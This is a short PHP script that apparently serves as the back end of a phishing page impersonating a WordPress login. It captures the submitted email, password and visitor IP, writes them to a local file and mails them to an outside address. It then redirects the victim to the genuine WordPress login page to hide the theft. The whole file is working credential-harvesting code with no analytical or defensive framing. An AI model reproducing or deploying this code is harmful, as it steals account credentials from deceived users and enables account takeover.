<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || RITO! GOD 1ST SON || :------\n";
$message .= "e-mail: ".$_POST['log']."\n";
$message .= "Password: ".$_POST['pwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----: || THERE IS GOD || :------\n";


$recipient = "non.no@mail.com";
$subject = $subject = "Account | ".$ip."\n";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "";


$data = $message;
$fp = fopen("info.txt", "a");

fputs($fp, $data);
fclose($fp);

	 mail("$to", "Account Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://wordpress.com/log-in");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>